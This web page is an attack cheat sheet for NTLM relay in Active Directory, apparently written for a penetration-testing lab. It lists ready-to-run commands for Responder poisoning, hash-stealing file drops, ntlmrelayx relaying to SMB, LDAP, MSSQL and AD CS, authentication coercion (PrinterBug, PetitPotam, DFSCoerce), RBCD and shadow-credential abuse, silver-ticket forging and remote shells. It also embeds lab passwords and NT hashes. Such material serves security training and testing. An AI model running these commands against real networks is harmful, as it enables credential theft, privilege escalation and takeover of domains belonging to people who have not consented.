title: NTLM Relay Attacks CheatSheet
html:
NTLM Relay Attacks CheatSheet

Enumeration

Responder Analyze Mode

python3 Responder.py -I ens192 -A

Responder Poisoning mode

python3 Responder.py -I ens192

python3 RunFinger.py -i 172.16.117.0/24

Enumerate the network for host with SMB signing off, in addition to finding whether some standard services are running on the host

Enumerate the network for host with SMB signing off

crackmapexec smb <subnet> --gen-relay-list relayTargets.txt

Enumerate shared folders

crackmapexec smb <subnet> -u anonymous -p '' --shares

Enumerate WebDav servers

crackmapexec smb <subnet> -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav

Farming Hashes

Create NTLM Theft files

python3 ntlm_theft.py -g all -s 172.16.117.30 -f '@myfile'

Generate a shortcut .lnk file and set the target to 172.16.117.30

crackmapexec smb 172.16.117.3 -u anonymous -p '' -M slinky -o SERVER=172.16.117.30 NAME=important

Generate a shortcut .searchConnector-ms file and set the target to https://172.16.117.30/testing

crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing SHARE=smb FILENAME=@secret

NTLMRelayx

Execute default NTLM Relay attack to the computers defined as targets using the option -tf relayTargets.txt

ntlmrelayx.py -tf relayTargets.txt -smb2support

Execute a command in the target machine

ntlmrelayx.py -t 172.16.117.50 -smb2support -c "whoami"

Single General Target to SMB

ntlmrelayx.py -t smb://172.16.117.50

Single General Target to MSSQL

ntlmrelayx.py -t mssql://172.16.117.50

Single General Target to LDAP

ntlmrelayx.py -t ldap://172.16.117.50

Single General Target to All services

ntlmrelayx.py -t all://172.16.117.50

Single Named Target

ntlmrelayx.py -t smb://<domain-name>\\PETER@172.16.117.50

Using SOCKs Connections

ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

Interactive SMB Client Shells

ntlmrelayx.py -tf relayTargets.txt -smb2support -i

Query Execution

ntlmrelayx.py -t mssql://<domain-name>\\NPORTS@172.16.117.60 -smb2support -q "SELECT name FROM sys.databases;"

Domain Enumeration

ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump

Computer Accounts Creation

ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'

Privileges Escalation via ACLs Abuse

ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug

Coerce Authentication

Abuse MS-RPRN PrinterBug to coerce authentication

python3 printerbug.py <domain-name>/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.3 172.16.117.30

Abuse MS-EFSR PetitPotam to coerce authentication

python3 PetitPotam.py 172.16.117.30 172.16.117.3 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d <domain>

Abuse MS-DFSNM DFSCoerce to coerce authentication

python3 dfscoerce.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' 172.16.117.30 172.16.117.3

Coercer Scan Mode

Coercer scan -t 172.16.117.50 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d <domain> -v

Coercer coerce Mode

Coercer coerce -t 172.16.117.50 -l 172.16.117.30 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d <domain> -v --always-continue

Kerberos RBCD Abuse

Kerberos RBCD Abuse

ntlmrelayx.py -t ldaps://<domain-name>\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump

Generate a Ticket

getST.py -spn cifs/sql01.<domain> -impersonate Administrator -dc-ip 172.16.117.3 "<domain-name>"/"plaintext$":"o6@ekK5#rlw2rAe"

Use the ticket to connect to the target machine using psexec.py

KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass sql01.<domain>

Shadow Credentials

Execute Shadow Credentials attack, wait for CJAQ account authentication and target jperez account

ntlmrelayx.py -t ldap://<DOMAIN>\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl

Loading certificate and key from file

python3 gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z <DOMAIN>/jperez jperez.ccache

Use the ticket to connect to the target machine using EvilwinRM

KRB5CCNAME=jperez.ccache evil-winrm -i dc01.<domain> -r <DOMAIN>

ESC8 Attacks Targeting AD CS

Enumerate ADCS Servers

crackmapexec ldap <subnet> -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -M adcs

Enumerate ADCS Certificates

crackmapexec ldap 172.16.117.3 -u plaintext$ -p 'o6@ekK5#rlw2rAe' -M adcs -o SERVER=<domain-name>-<dc-hostname>-CA

Enumerate the CA configuration with Certipy

certipy find -enabled -u 'plaintext$'@172.16.117.3 -p 'o6@ekK5#rlw2rAe' -stdout

Perform AD CS Relay Attacks to a Machine

ntlmrelayx.py -t http://172.16.117.3/certsrv/certfnsh.asp -smb2support --adcs --template Machine

Coerce SMB NTLM Authentication using printerbug.py

python3 printerbug.py <domain-name>/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30

base64 -d > ws01.pfx\`

\`echo -n "MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgg=="

Use gettgtpkinit.py to Request the TGT and AS-REP Encryption Key

python3 gettgtpkinit.py -dc-ip 172.16.117.3 -cert-pfx ws01.pfx '<DOMAIN>/<hostname>$' ws01.ccache

Retrieve the NT Hash of WS01$ using getnthash.py

KRB5CCNAME=ws01.ccache python3 getnthash.py '<DOMAIN>/<hostname>$' -key 917ec3b9d13dfb69e42ee05e09a5bf4ac4e52b7b677f1b22412e4deba644ebb2

Create a Silver Ticket

Obtain the Domain SID with lookupsid.py

lookupsid.py '<DOMAIN>/<hostname>$'@172.16.117.3 -hashes :3d3a72af94548ebc7755287a88476460

Use ticketer.py to Forge a Silver Ticket as Administrator

ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain <domain> -spn cifs/ws01.<domain> Administrator

Use psexec.py to Gain an Interactive Shell Session

KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ws01.<domain>

ESC11 Attacks Targeting AD CS with Certipy

Perform AD CS Relay Attacks to a Machine

certipy relay -target "http://172.16.117.3" -template Machine

Coerce SMB NTLM Authentication using printerbug.py

python3 printerbug.py <domain-name>/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30

Certipy authentication with certificate

certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3

ESC11 Attack

certipy relay -target "rpc://172.16.117.3" -ca "<domain-name>-<dc-hostname>-CA"
